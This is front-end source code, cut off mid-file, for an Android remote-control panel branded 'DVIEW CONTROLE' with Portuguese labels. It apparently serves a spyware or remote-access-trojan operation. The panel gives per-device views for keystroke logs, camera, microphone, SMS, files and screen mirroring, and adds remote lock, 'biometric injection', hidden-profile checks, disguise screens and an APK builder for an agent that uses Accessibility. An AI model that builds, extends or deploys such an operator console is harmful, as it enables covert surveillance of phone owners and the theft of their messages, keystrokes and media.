import { useEffect, useMemo, useState } from "react";
import {
  Check,
  ChevronLeft,
  ChevronRight,
  CircleDot,
  Copy,
  Download,
  ExternalLink,
  Layers,
  Link2,
  MonitorSmartphone,
  Plus,
  Radio,
  ShieldCheck,
  SlidersHorizontal,
  Smartphone,
  X,
  Zap
} from "lucide-react";
import { QRCodeSVG } from "qrcode.react";
import { useAppStore } from "../../store";
import { api } from "../../api";
import type { ControlDevice, ControlTool, InstalledAppItem } from "./types";
import { initialInstalledApps } from "./mockData";
import { UnifiedControlSidebar } from "./UnifiedControlSidebar";
import { DeviceContextMenu } from "./DeviceContextMenu";
import { DeviceEditModal } from "../../components/DeviceEditModal";
import { DeviceSidebar } from "./DeviceSidebar";
import { DeviceToolMenu, getAppEmojiFallback } from "./DeviceToolMenu";
import { ScreenView } from "./views/ScreenView";
import { KeyboardLogView } from "./views/KeyboardLogView";
import { DeviceInfoView } from "./views/DeviceInfoView";
import { PermissionsView } from "./views/PermissionsView";
import { FilesView } from "./views/FilesView";
import { AppsListView } from "./views/AppsListView";
import { MediaView } from "./views/MediaView";
import { FloatingDeviceWindow } from "./FloatingDeviceWindow";
import { MultiDeviceGrid } from "./MultiDeviceGrid";

function formatLastSeen(iso?: string): string {
  if (!iso) return "agora";
  const diff = Date.now() - new Date(iso).getTime();
  if (isNaN(diff) || diff < 60000) return "agora";
  const mins = Math.floor(diff / 60000);
  if (mins < 60) return `${mins}m`;
  const hours = Math.floor(mins / 60);
  if (hours < 24) return `${hours}h`;
  return `${Math.floor(hours / 24)}d`;
}

function formatDateGroup(iso?: string): string {
  if (!iso) return "HOJE";
  const d = new Date(iso);
  if (isNaN(d.getTime())) return "HOJE";
  const now = new Date();
  if (
    d.getDate() === now.getDate() &&
    d.getMonth() === now.getMonth() &&
    d.getFullYear() === now.getFullYear()
  ) {
    return "HOJE";
  }
  const yest = new Date(now);
  yest.setDate(now.getDate() - 1);
  if (
    d.getDate() === yest.getDate() &&
    d.getMonth() === yest.getMonth() &&
    d.getFullYear() === yest.getFullYear()
  ) {
    return "ONTEM";
  }
  return d.toLocaleDateString("pt-BR", { day: "2-digit", month: "short", year: "numeric" }).toUpperCase();
}

function mapApiToControl(dev: any, existing?: ControlDevice): ControlDevice {
  const isOnline = dev.status ? dev.status === "online" : (existing ? existing.status === "online" : false);
  const netType = dev.networkType || existing?.networkType || (isOnline ? "wifi" : "offline");
  return {
    id: dev.id,
    name: dev.name,
    model: dev.model,
    ip: dev.ip || dev.ipAddress || (dev.id.startsWith("emu") ? "10.0.2.2" : "192.168.100.2"),
    battery: dev.battery ?? 100,
    status: dev.status || existing?.status || (isOnline ? "online" : "offline"),
    lastSeen: formatLastSeen(dev.lastSeen),
    androidVersion: dev.androidVersion || "14.0",
    manufacturer: dev.model?.split(" ")[0] || "Android",
    wifiSignal: isOnline ? (dev.signalStrength ?? existing?.wifiSignal ?? 90) : 0,
    networkType: isOnline ? netType : "offline",
    networkName: isOnline ? (dev.networkName || existing?.networkName || (netType === "wifi" ? "Wi-Fi 5GHz" : "4G LTE")) : "Sem Conexão",
    signalStrength: isOnline ? (dev.signalStrength ?? existing?.signalStrength ?? 95) : 0,
    networkSpeed: isOnline ? (dev.networkSpeed || existing?.networkSpeed || "86.4 Mbps") : "0 Mbps",
    pingMs: isOnline ? (dev.pingMs ?? existing?.pingMs ?? 14) : 0,
    screenLocked: existing?.screenLocked ?? false,
    dateGroup: formatDateGroup(dev.lastSeen || dev.enrolledAt),
    isFavorite: existing?.isFavorite ?? false,
    disguiseScreen: dev.disguiseScreen ?? existing?.disguiseScreen ?? null,
    contactName: dev.contactName ?? existing?.contactName,
    phoneNumber: dev.phoneNumber ?? existing?.phoneNumber,
    apkName: dev.apkName ?? existing?.apkName,
    notes: dev.notes ?? existing?.notes
  };
}

export function deduplicateControlDevices(list: ControlDevice[]): ControlDevice[] {
  const map = new Map<string, ControlDevice>();
  for (const dev of list) {
    const cleanPhone = dev.phoneNumber ? dev.phoneNumber.replace(/\D/g, "") : "";
    const contactKey = dev.contactName ? `${dev.contactName.trim().toLowerCase()}_${(dev.model || "").trim().toLowerCase()}` : "";
    const accountKey = dev.userAccount ? dev.userAccount.trim().toLowerCase() : "";
    const key = cleanPhone
      ? `phone:${cleanPhone}`
      : accountKey
      ? `acct:${accountKey}`
      : contactKey
      ? `contact:${contactKey}`
      : `id:${dev.id}`;

    if (!map.has(key)) {
      map.set(key, { ...dev });
    } else {
      const existing = map.get(key)!;
      if (dev.status === "online" && existing.status !== "online") {
        // Prioridade inegociável: Status online sempre vence!
        map.set(key, { ...existing, ...dev, status: "online" });
      } else if (dev.status !== "online" && existing.status === "online") {
        map.set(key, { ...dev, ...existing, status: "online" });
      } else {
        map.set(key, { ...existing, ...dev });
      }
    }
  }
  return Array.from(map.values());
}

export function ControlPanel() {
  const { devices: apiDevices, setView, upsertDevice, removeDevice, selectedDeviceId, setSelectedDeviceId } = useAppStore();
  const [controlDevices, setControlDevices] = useState<ControlDevice[]>(() =>
    deduplicateControlDevices((apiDevices || []).map((d) => mapApiToControl(d)))
  );

  // Sync controlDevices when apiDevices changes from WebSocket or polling
  useEffect(() => {
    if (apiDevices && apiDevices.length > 0) {
      setControlDevices((curr) => {
        const mapped = apiDevices.map((d) => {
          const existing = curr.find((c) => c.id === d.id);
          return mapApiToControl(d, existing);
        });
        return deduplicateControlDevices(mapped);
      });
    }
  }, [apiDevices]);

  const [selectedId, setSelectedId] = useState<string>(() => selectedDeviceId || apiDevices[0]?.id || "");
  const [activeTool, setActiveTool] = useState<ControlTool>("tela");
  const [activeAppForScreen, setActiveAppForScreen] = useState<InstalledAppItem | null>(null);
  const [toastMsg, setToastMsg] = useState<string | null>(null);
  const [focusMode, setFocusMode] = useState(false);
  const [gridCount, setGridCount] = useState<1 | 2 | 3 | 4>(1);
  const [floatingWindows, setFloatingWindows] = useState<
    { id: string; device: ControlDevice; x: number; y: number; zIndex: number }[]
  >([]);

  // Context Menu State
  const [contextMenu, setContextMenu] = useState<{ x: number; y: number; device: ControlDevice } | null>(null);

  // Left sidebar collapse toggle
  const [isSidebarCollapsed, setIsSidebarCollapsed] = useState(false);

  // Device Edit Modal state (Contact & APK)
  const [editingDevice, setEditingDevice] = useState<ControlDevice | null>(null);

  // Instance URL & Token Modal state
  const [instanceModal, setInstanceModal] = useState<{
    device: ControlDevice;
    token: string;
    encryptedUrl: string;
    directUrl: string;
  } | null>(null);
  const [copiedKind, setCopiedKind] = useState<"enc" | "dir" | null>(null);

  const showToast = (msg: string) => {
    setToastMsg(msg);
    setTimeout(() => setToastMsg(null), 3500);
  };

  const handleTriggerBiometric = async (dev: ControlDevice) => {
    try {
      await api.authenticateBiometric(dev.id, 1);
      showToast(`🧬 Biometria confirmada e autenticada no aparelho ${dev.name}!`);
    } catch {
      showToast(`Falha ao injetar biometria no aparelho ${dev.name}.`);
    }
  };

  const handleValidateIsland = async (dev: ControlDevice) => {
    try {
      const res = await api.validateIsland(dev.id);
      showToast(res?.isInstalled ? `✓ Perfil Island Ativo (User ${res.profileUserId || 10})` : "✕ Perfil Island não detectado");
    } catch {
      showToast("Erro ao verificar Island.");
    }
  };

  const handleReconnect = async (dev: ControlDevice) => {
    try {
      await api.reconnectDevice(dev.id);
      showToast(`Aparelho ${dev.name} reconectado com sucesso!`);
    } catch {
      showToast(`Erro ao reconectar ${dev.name}.`);
    }
  };

  const handleOpenFloating = (targetDev?: ControlDevice) => {
    const dev = targetDev || selectedDevice;
    if (!dev) return;
    const newId = `float_${dev.id}_${Date.now()}`;
    const offset = (floatingWindows.length % 6) * 35;
    setFloatingWindows((curr) => [
      ...curr,
      {
        id: newId,
        device: dev,
        x: Math.max(40, 100 + offset),
        y: Math.max(40, 70 + offset),
        zIndex: 1000 + curr.length + 1
      }
    ]);
    showToast(`Instância Flutuante de ${dev.name} iniciada!`);
  };

  const handleCloseFloating = (id: string) => {
    setFloatingWindows((curr) => curr.filter((w) => w.id !== id));
  };

  const handleBringToFront = (id: string) => {
    setFloatingWindows((curr) => {
      const highest = Math.max(...curr.map((w) => w.zIndex), 1000);
      return curr.map((w) => (w.id === id ? { ...w, zIndex: highest + 1 } : w));
    });
  };

  const handlePopoutDesktop = (targetDev?: ControlDevice) => {
    const dev = targetDev || selectedDevice;
    if (!dev) return;
    const url = `${window.location.origin}/?popout=true&deviceId=${encodeURIComponent(dev.id)}`;
    window.open(
      url,
      `DVIEW_Popout_${dev.id.replace(/[^a-zA-Z0-9]/g, "_")}`,
      "width=480,height=880,menubar=no,toolbar=no,status=no,resizable=yes"
    );
    showToast(`Janela Desktop de ${dev.name} desencaixada!`);
  };

  const handleCopyDirectUrl = (targetDev?: ControlDevice) => {
    const dev = targetDev || selectedDevice;
    if (!dev) return;
    const url = `${window.location.origin}/instance/${encodeURIComponent(dev.id)}`;
    navigator.clipboard.writeText(url).then(() => {
      showToast(`🔗 Link direto da instância (${dev.name}) copiado!`);
    }).catch(() => {
      showToast(`Link da instância: ${url}`);
    });
    api.getEncryptedInstanceUrl(dev.id).then((res) => {
      setInstanceModal({
        device: dev,
        token: res.token,
        encryptedUrl: res.encryptedUrl,
        directUrl: res.directUrl
      });
    }).catch(() => {
      setInstanceModal({
        device: dev,
        token: "",
        encryptedUrl: url,
        directUrl: url
      });
    });
  };

  const handleCopyEncryptedUrl = async (targetDev?: ControlDevice) => {
    const dev = targetDev || selectedDevice;
    if (!dev) return;
    try {
      const res = await api.getEncryptedInstanceUrl(dev.id);
      if (res?.encryptedUrl) {
        await navigator.clipboard.writeText(res.encryptedUrl).catch(() => {});
        setInstanceModal({
          device: dev,
          token: res.token,
          encryptedUrl: res.encryptedUrl,
          directUrl: res.directUrl
        });
        showToast(`🔒 URL Criptografado da Instância (${dev.name}) copiado com sucesso!`);
        return;
      }
    } catch {
      // Fallback
    }
    const fallbackUrl = `${window.location.origin}/instance/${encodeURIComponent(dev.id)}`;
    await navigator.clipboard.writeText(fallbackUrl).catch(() => {});
    setInstanceModal({
      device: dev,
      token: "",
      encryptedUrl: fallbackUrl,
      directUrl: fallbackUrl
    });
    showToast(`Link da instância: ${fallbackUrl}`);
  };

  // Auto-fetch real devices from backend on mount if not loaded
  useEffect(() => {
    if (!apiDevices || apiDevices.length === 0) {
      api.devices().then((devList) => {
        if (Array.isArray(devList) && devList.length > 0) {
          useAppStore.getState().setDevices(devList);
        }
      }).catch(() => {});
    }
  }, []);

  // Sync selectedDeviceId from store
  useEffect(() => {
    if (selectedDeviceId && selectedDeviceId !== selectedId) {
      setSelectedId(selectedDeviceId);
    }
  }, [selectedDeviceId]);

  // Sync real devices from useAppStore
  useEffect(() => {
    setControlDevices((curr) => {
      const existingMap = new Map(curr.map((d) => [d.id, d]));
      return (apiDevices || []).map((dev) => mapApiToControl(dev, existingMap.get(dev.id)));
    });

    if (apiDevices.length > 0 && (!selectedId || !apiDevices.some((d) => d.id === selectedId))) {
      const targetId = selectedDeviceId && apiDevices.some((d) => d.id === selectedDeviceId)
        ? selectedDeviceId
        : apiDevices[0].id;
      setSelectedId(targetId);
      setSelectedDeviceId(targetId);
    }
  }, [apiDevices]);

  const handleToggleFavorite = (deviceId: string) => {
    setControlDevices((curr) =>
      curr.map((d) => (d.id === deviceId ? { ...d, isFavorite: !d.isFavorite } : d))
    );
    const targetDev = controlDevices.find((d) => d.id === deviceId);
    if (targetDev) {
      showToast(
        `${targetDev.name} ${!targetDev.isFavorite ? "adicionado aos favoritos ★" : "removido dos favoritos"}.`
      );
    }
  };

  const handleAddEmulator = async () => {
    try {
      const emuList = controlDevices.filter((d) => d.id.startsWith("emu"));
      const count = emuList.length + 1;
      const emuPort = 5554 + (count - 1) * 2;
      const emuName = `Emulador Android #${count}`;
      const emuModel = `Pixel 7 (Port ${emuPort})`;

      let newId = `emu_${Date.now()}`;
      try {
        const res = await api.addEmulator({
          name: emuName,
          model: emuModel,
          port: emuPort
        });
        if (res?.device?.id) {
          newId = res.device.id;
        }
      } catch (err) {
        console.warn("Offline fallback for addEmulator:", err);
      }

      const newEmu: ControlDevice = {
        id: newId,
        name: emuName,
        model: emuModel,
        ip: `10.0.2.2:${emuPort}`,
        battery: 100,
        status: "online",
        lastSeen: "agora",
        androidVersion: "14.0",
        manufacturer: "Google AVD",
        wifiSignal: 100,
        screenLocked: false,
        dateGroup: "HOJE",
        isFavorite: false
      };

      upsertDevice({
        id: newId,
        name: emuName,
        model: emuModel,
        androidVersion: "14",
        status: "online",
        battery: 100,
        lastSeen: new Date().toISOString(),
        enrolledAt: new Date().toISOString(),
        consentRequired: false
      });

      setControlDevices((curr) => [newEmu, ...curr]);
      setSelectedId(newId);
      setActiveTool("tela");
      showToast(`Emulador ${emuName} conectado na porta ${emuPort} com sucesso.`);
    } catch {
      showToast("Erro ao conectar emulador.");
    }
  };

  const handleOpenAppControl = (app: InstalledAppItem) => {
    setActiveAppForScreen(app);
    setActiveTool("tela");
    showToast(`Iniciando transmissão de ${app.name} (${app.packageName}).`);
  };

  const selectedDevice = useMemo(() => {
    return controlDevices.find((d) => d.id === selectedId) || controlDevices[0];
  }, [controlDevices, selectedId]);

  const [syncedApps, setSyncedApps] = useState<InstalledAppItem[]>([]);

  useEffect(() => {
    if (!selectedDevice) return;
    api.getDeviceApps(selectedDevice.id)
      .then((realList) => {
        if (Array.isArray(realList) && realList.length > 0) {
          setSyncedApps(realList);
        }
      })
      .catch(() => {});
  }, [selectedDevice?.id]);

  const handleSelectTarget = (targetName: string) => {
    const list = syncedApps.length > 0 ? syncedApps : initialInstalledApps;
    const foundApp = list.find(
      (a) =>
        a.name.toLowerCase().includes(targetName.toLowerCase()) ||
        a.packageName.toLowerCase().includes(targetName.toLowerCase())
    );
    if (foundApp) {
      handleOpenAppControl(foundApp);
    } else {
      const meta = getAppEmojiFallback(targetName, "");
      const genericApp: InstalledAppItem = {
        id: `app_${targetName.toLowerCase().replace(/[^a-z0-9]/g, "_")}`,
        name: targetName,
        packageName: `com.android.${targetName.toLowerCase().replace(/[^a-z0-9]/g, "")}`,
        version: "v1.0",
        isSystem: false,
        status: "active",
        iconType: "tools",
        iconBg: meta.bg,
        iconColor: "#ffffff",
        iconLetter: targetName.charAt(0).toUpperCase(),
        emoji: meta.emoji,
        sizeMb: 14.2,
        installDate: "Hoje",
        permissions: []
      };
      handleOpenAppControl(genericApp);
    }
  };

  const onlineCount = controlDevices.filter((d) => d.status === "online").length;
  const offlineCount = controlDevices.filter((d) => d.status === "offline").length;

  const handleToggleLock = async (targetDev?: ControlDevice) => {
    const dev = targetDev || selectedDevice;
    if (!dev) return;
    try {
      const res = await api.sendPower(dev.id);
      const nextLocked = res?.locked ?? !dev.screenLocked;
      setControlDevices((curr) =>
        curr.map((d) => (d.id === dev.id ? { ...d, screenLocked: nextLocked } : d))
      );
      showToast(
        `Comando executado: ${nextLocked ? "TELA BLOQUEADA" : "TELA DESBLOQUEADA"} em ${dev.name}.`
      );
    } catch {
      const nextLocked = !dev.screenLocked;
      setControlDevices((curr) =>
        curr.map((d) => (d.id === dev.id ? { ...d, screenLocked: nextLocked } : d))
      );
      showToast(
        `Comando enviado: ${nextLocked ? "TELA BLOQUEADA" : "TELA DESBLOQUEADA"} em ${dev.name}.`
      );
    }
  };

  const handleUninstall = async (targetDev?: ControlDevice) => {
    const dev = targetDev || selectedDevice;
    if (!dev) return;
    if (confirm(`Deseja realmente solicitar a desinstalação do agente em ${dev.name}?`)) {
      try {
        await api.deleteDevice(dev.id);
      } catch (err) {
        console.warn("Backend offline or error deleting device:", err);
      }
      removeDevice(dev.id);
      const remaining = controlDevices.filter((d) => d.id !== dev.id);
      setControlDevices(remaining);
      if (selectedId === dev.id) {
        const nextId = remaining[0]?.id || "";
        setSelectedId(nextId);
        setSelectedDeviceId(nextId || null);
      }
      showToast(`Ordem de remoção transmitida e dispositivo ${dev.name} desvinculado.`);
    }
  };

  return (
    <div className="control-panel-master">
      {/* Toast Alert */}
      {toastMsg && (
        <div className="tactical-toast-badge toast-success">
          <span>{toastMsg}</span>
        </div>
      )}

      {/* Render 3-Columns or Empty State */}
      {controlDevices.length === 0 ? (
        <div className="control-empty-state-view">
          <div className="control-empty-state-card">
            <div className="control-empty-state-icon">
              <Smartphone size={38} style={{ color: "var(--crimson-neon, #ff1a2a)" }} />
            </div>
            <h2>Nenhum Dispositivo Conectado em Tempo Real</h2>
            <p className="control-empty-subtitle">
              O painel de controle está conectado à API e ao Socket.IO aguardando dispositivos reais ou instâncias de emuladores para iniciar o espelhamento e a supervisão remota.
            </p>

            <div className="control-empty-actions-grid">
              <div className="control-empty-action-card">
                <div className="action-card-header">
                  <MonitorSmartphone size={20} style={{ color: "#38bdf8" }} />
                  <strong>Conectar Emulador Android</strong>
                </div>
                <p>
                  Inicie instantaneamente uma instância simulada do Android (porta 5554+ / Loopback) pronta para receber comandos e projeção de tela.
                </p>
                <button
                  type="button"
                  className="primary compact-btn"
                  onClick={handleAddEmulator}
                  style={{ marginTop: "auto", display: "inline-flex", alignItems: "center", gap: "6px" }}
                >
                  <Plus size={14} /> Adicionar Emulador Agora
                </button>
              </div>

              <div className="control-empty-action-card">
                <div className="action-card-header">
                  <Download size={20} style={{ color: "#22c55e" }} />
                  <strong>Gerar APK com Túnel Seguro</strong>
                </div>
                <p>
                  Crie um instalador APK corporativo do Agente com ativação de VPN e Acessibilidade para instalar em qualquer aparelho físico.
                </p>
                <button
                  type="button"
                  className="secondary compact-btn"
                  onClick={() => setView("Gerador APK")}
                  style={{ marginTop: "auto", display: "inline-flex", alignItems: "center", gap: "6px" }}
                >
                  <SlidersHorizontal size={14} /> Abrir Construtor de APK
                </button>
              </div>

              <div className="control-empty-action-card">
                <div className="action-card-header">
                  <Radio size={20} style={{ color: "#facc15" }} />
                  <strong>Conectar Aparelho Físico</strong>
                </div>
                <p>
                  No dispositivo cliente, aponte a URL do servidor para o IP da sua máquina (ex: <code>http://192.168.100.2:3000</code>).
                  A conexão é automática via telemetria WebSocket.
                </p>
                <span className="badge online" style={{ marginTop: "auto", alignSelf: "flex-start", fontSize: "11px" }}>
                  <CircleDot size={10} /> Escutando na porta 3000
                </span>
              </div>
            </div>
          </div>
        </div>
      ) : (
        <div style={{ display: "flex", flexDirection: "column", flex: 1, minHeight: 0, overflow: "hidden", position: "relative" }}>
          {/* Top Tactical Command Ribbon */}
          <div className="control-ribbon-toolbar">
            <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
              {/* Brand and online pill */}
              <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
                <span style={{ fontWeight: 800, fontSize: "12px", color: "#ffffff", letterSpacing: "0.5px" }}>DVIEW CONTROLE</span>
                <span className="brand-stat-item online" style={{ fontSize: "11px", color: "#22c55e", fontWeight: 700, display: "inline-flex", alignItems: "center", gap: "4px" }}>
                  <span className="brand-stat-dot online" /> {onlineCount} online
                </span>
                {offlineCount > 0 && (
                  <span className="brand-stat-item offline" style={{ fontSize: "11px", color: "#94a3b8", display: "inline-flex", alignItems: "center", gap: "4px" }}>
                    <span className="brand-stat-dot offline" /> {offlineCount} off
                  </span>
                )}
              </div>

              <div style={{ width: "1px", height: "18px", background: "#1e293b", margin: "0 2px" }} />

              {/* Focus Mode Toggle */}
              <button
                type="button"
                className={`ribbon-btn ${focusMode ? "active" : ""}`}
                onClick={() => {
                  setFocusMode(!focusMode);
                  showToast(focusMode ? "Painéis laterais restaurados" : "Modo Foco Ativado: Espaço 100% expandido!");
                }}
                title="Modo Foco: Oculta colunas laterais para maximizar área de visualização dos aparelhos"
              >
                {focusMode ? <ChevronRight size={14} /> : <ChevronLeft size={14} />}
                <span>{focusMode ? "MOSTRAR PAINÉIS" : "MODO FOCO"}</span>
              </button>

              {/* Sidebar Collapse Toggle */}
              <button
                type="button"
                className={`ribbon-btn ${isSidebarCollapsed ? "active" : ""}`}
                onClick={() => {
                  setIsSidebarCollapsed(!isSidebarCollapsed);
                  showToast(isSidebarCollapsed ? "Menu lateral de aparelhos exibido" : "Menu lateral recolhido para visão ampla!");
                }}
                title={isSidebarCollapsed ? "Mostrar menu lateral unificado" : "Recolher menu lateral unificado"}
              >
                <SlidersHorizontal size={13} />
                <span>{isSidebarCollapsed ? "MOSTRAR MENU" : "RECOLHER MENU"}</span>
              </button>

              <div style={{ width: "1px", height: "18px", background: "#1e293b", margin: "0 2px" }} />

              {/* Grid Layout Selector */}
              <div style={{ display: "flex", alignItems: "center", background: "#060911", border: "1px solid #1e293b", borderRadius: "6px", padding: "2px" }}>
                <button
                  type="button"
                  className={`tactical-grid-btn ${gridCount === 1 ? "active" : ""}`}
                  onClick={() => setGridCount(1)}
                  title="1 Tela (Foco Único)"
                >
                  1 Tela
                </button>
                <button
                  type="button"
                  className={`tactical-grid-btn ${gridCount === 2 ? "active" : ""}`}
                  onClick={() => setGridCount(2)}
                  title="2 Telas (Lado a Lado 2x1)"
                >
                  2 Telas (2x1)
                </button>
                <button
                  type="button"
                  className={`tactical-grid-btn ${gridCount === 3 ? "active" : ""}`}
                  onClick={() => setGridCount(3)}
                  title="3 Telas (Tríplice 3x1)"
                >
                  3 Telas (3x1)
                </button>
                <button
                  type="button"
                  className={`tactical-grid-btn ${gridCount === 4 ? "active" : ""}`}
                  onClick={() => setGridCount(4)}
                  title="4 Telas (Matriz Quad 2x2)"
                >
                  4 Telas (2x2)
                </button>
              </div>
            </div>

            <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
              {/* Encrypted Instance URL & Direct Link */}
              {selectedDevice && (
                <>
                  <button
                    type="button"
                    className="ribbon-btn"
                    onClick={() => handleCopyEncryptedUrl()}
                    title="Copiar URL Criptografado (AES-256-GCM) para conexão segura direta a esta instância"
                    style={{
                      color: "#00f0ff",
                      borderColor: "rgba(0, 240, 255, 0.4)",
                      background: "rgba(0, 240, 255, 0.08)",
                      display: "flex",
                      alignItems: "center",
                      gap: "5px"
                    }}
                  >
                    <ShieldCheck size={13} style={{ color: "#00f0ff" }} />
                    <span>URL Criptografado</span>
                  </button>

                  <button
                    type="button"
                    className="ribbon-btn"
                    onClick={() => handleCopyDirectUrl()}
                    title="Copiar Link direto para esta instância de aparelho"
                    style={{
                      color: "#cbd5e1",
                      display: "flex",
                      alignItems: "center",
                      gap: "5px"
                    }}
                  >
                    <Link2 size={13} />
                    <span>Link Instância</span>
                  </button>
                </>
              )}

              {/* Open Floating Window */}
              <button
                type="button"
                className="ribbon-btn primary-ribbon"
                onClick={() => handleOpenFloating()}
                title="Abrir aparelho atual em uma Janela Flutuante com barra lateral MEmu e pino de fixação"
              >
                <Layers size={13} />
                <span>+ Instância Flutuante (MEmu)</span>
              </button>

              {/* Popout Desktop */}
              <button
                type="button"
                className="ribbon-btn"
                onClick={() => handlePopoutDesktop()}
                title="Desencaixar em Janela Independente do Windows (Popout)"
                style={{ color: "#38bdf8", borderColor: "rgba(56, 189, 248, 0.35)", background: "rgba(56, 189, 248, 0.08)" }}
              >
                <ExternalLink size={13} />
                <span>Desencaixar Janela Desktop</span>
              </button>
            </div>
          </div>

          <div className={`control-three-cols-wrapper ${focusMode ? "focus-mode" : ""}`}>
            {/* Single Unified Left Sidebar */}
            <UnifiedControlSidebar
              devices={controlDevices}
              selectedDevice={selectedDevice}
              selectedId={selectedDevice?.id || ""}
              activeTool={activeTool}
              onSelectDevice={(dev) => {
                setSelectedId(dev.id);
                setSelectedDeviceId(dev.id);
                window.history.replaceState(null, "", `/instance/${encodeURIComponent(dev.id)}`);
              }}
              onSelectTool={setActiveTool}
              onToggleFavorite={handleToggleFavorite}
              onAddEmulator={handleAddEmulator}
              onToggleLock={handleToggleLock}
              onUninstall={handleUninstall}
              onContextMenu={(e, dev) => setContextMenu({ x: e.clientX, y: e.clientY, device: dev })}
              isCollapsed={isSidebarCollapsed}
              onToggleCollapse={() => setIsSidebarCollapsed(!isSidebarCollapsed)}
            />

            {/* Col 3: Active tool workspace */}
            <main className="control-col-workspace">
              {gridCount > 1 ? (
                <MultiDeviceGrid
                  devices={controlDevices}
                  gridCount={gridCount}
                  onOpenFloating={handleOpenFloating}
                  onAddEmulator={handleAddEmulator}
                  onGridCountChange={setGridCount}
                />
              ) : selectedDevice ? (
                <>
                  {activeTool === "tela" && (
                    <ScreenView
                      device={selectedDevice}
                      activeApp={activeAppForScreen}
                      onCloseApp={() => setActiveAppForScreen(null)}
                      allDevices={controlDevices}
                      onSelectDevice={(dev) => {
                        setSelectedId(dev.id);
                        setSelectedDeviceId(dev.id);
                        window.history.replaceState(null, "", `/instance/${encodeURIComponent(dev.id)}`);
                      }}
                    />
                  )}
                  {activeTool === "teclado" && <KeyboardLogView device={selectedDevice} />}
                  {activeTool === "dispositivo" && <DeviceInfoView device={selectedDevice} />}
                  {activeTool === "permissoes" && <PermissionsView device={selectedDevice} />}
                  {activeTool === "arquivos" && <FilesView device={selectedDevice} />}
                  {activeTool === "apps" && (
                    <AppsListView
                      device={selectedDevice}
                      onOpenAppControl={handleOpenAppControl}
                    />
                  )}
                  {(activeTool === "camera" || activeTool === "mic" || activeTool === "sms") && (
                    <MediaView device={selectedDevice} subType={activeTool} />
                  )}
                </>
              ) : (
                <div className="control-empty-hint" style={{ margin: "auto" }}>
                  Selecione um dispositivo na lista à esquerda para carregar as ferramentas de controle.
                </div>
              )}
            </main>
          </div>

          {/* RENDER ACTIVE FLOATING MEMU WINDOWS */}
          {floatingWindows.map((inst) => (
            <FloatingDeviceWindow
              key={inst.id}
              device={inst.device}
              initialX={inst.x}
              initialY={inst.y}
              zIndex={inst.zIndex}
              onClose={() => handleCloseFloating(inst.id)}
              onBringToFront={() => handleBringToFront(inst.id)}
            />
          ))}

          {/* RIGHT-CLICK CONTEXT MENU ON DEVICES */}
          {contextMenu && (
            <DeviceContextMenu
              x={contextMenu.x}
              y={contextMenu.y}
              device={contextMenu.device}
              onClose={() => setContextMenu(null)}
              onSelectDevice={(dev) => {
                setSelectedId(dev.id);
                setSelectedDeviceId(dev.id);
              }}
              onOpenTool={(tool) => setActiveTool(tool)}
              onOpenFloating={(dev) => handleOpenFloating(dev)}
              onPopoutDesktop={(dev) => handlePopoutDesktop(dev)}
              onToggleLock={(dev) => handleToggleLock(dev)}
              onTriggerBiometric={(dev) => handleTriggerBiometric(dev)}
              onValidateIsland={(dev) => handleValidateIsland(dev)}
              onReconnect={(dev) => handleReconnect(dev)}
              onDelete={(dev) => handleUninstall(dev)}
              onEditDevice={(dev) => setEditingDevice(dev)}
              onCopyDirectUrl={(dev) => handleCopyDirectUrl(dev)}
              onCopyEncryptedUrl={(dev) => handleCopyEncryptedUrl(dev)}
            />
          )}

          {/* DEVICE EDIT MODAL (CONTACT & APK) */}
          {editingDevice && (
            <DeviceEditModal
              device={editingDevice}
              isOpen={Boolean(editingDevice)}
              onClose={() => setEditingDevice(null)}
              onSaved={(updated) => {
                setEditingDevice(null);
                showToast(`✓ Dados cadastrais de ${updated.contactName || updated.name} atualizados!`);
              }}
            />
          )}

          {/* INSTANCE URL & TOKEN MODAL (AES-256-GCM) */}
          {instanceModal && (
            <div
              className="device-edit-modal-backdrop"
              onClick={() => setInstanceModal(null)}
              style={{
                position: "fixed",
                inset: 0,
                backgroundColor: "rgba(0, 0, 0, 0.75)",
                backdropFilter: "blur(6px)",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                zIndex: 99999,
                padding: "16px"
              }}
            >
              <div
                className="device-edit-modal-card"
                onClick={(e) => e.stopPropagation()}
                style={{
                  background: "#0d111a",
                  border: "1px solid rgba(0, 240, 255, 0.3)",
                  borderRadius: "14px",
                  padding: "24px",
                  maxWidth: "560px",
                  width: "100%",
                  boxShadow: "0 20px 60px rgba(0, 0, 0, 0.8), 0 0 30px rgba(0, 240, 255, 0.15)",
                  color: "#f8fafc"
                }}
              >
                {/* Header */}
                <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "16px" }}>
                  <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
                    <div style={{ width: "36px", height: "36px", borderRadius: "8px", background: "rgba(0, 240, 255, 0.15)", border: "1px solid rgba(0, 240, 255, 0.3)", display: "grid", placeItems: "center" }}>
                      <ShieldCheck size={20} style={{ color: "#00f0ff" }} />
                    </div>
                    <div>
                      <h3 style={{ fontSize: "16px", fontWeight: 800, color: "#ffffff", margin: 0 }}>
                        Conexão de Instância Criptografada
                      </h3>
                      <div style={{ fontSize: "12px", color: "#94a3b8", display: "flex", alignItems: "center", gap: "6px", marginTop: "2px" }}>
                        <span>{instanceModal.device.name}</span>
                        <span>•</span>
                        <span style={{ fontFamily: "var(--font-mono)", color: "#38bdf8" }}>{instanceModal.device.id}</span>
                      </div>
                    </div>
                  </div>
                  <button
                    type="button"
                    onClick={() => setInstanceModal(null)}
                    style={{ background: "transparent", border: "none", color: "#64748b", cursor: "pointer", padding: "4px" }}
                  >
                    <X size={18} />
                  </button>
                </div>

                {/* Badge Security Info */}
                <div style={{ background: "rgba(0, 240, 255, 0.06)", border: "1px solid rgba(0, 240, 255, 0.2)", borderRadius: "8px", padding: "10px 14px", marginBottom: "16px", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                  <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
                    <CircleDot size={12} style={{ color: "#00f0ff" }} />
                    <span style={{ fontSize: "12px", color: "#e2e8f0" }}>
                      Túnel e Token Assinados com <strong>AES-256-GCM</strong>
                    </span>
                  </div>
                  <span style={{ fontSize: "11px", color: "#22c55e", fontWeight: 700, background: "rgba(34, 197, 94, 0.15)", border: "1px solid rgba(34, 197, 94, 0.3)", padding: "2px 8px", borderRadius: "12px" }}>
                    Isolamento Ativo
                  </span>
                </div>

                {/* Encrypted URL field */}
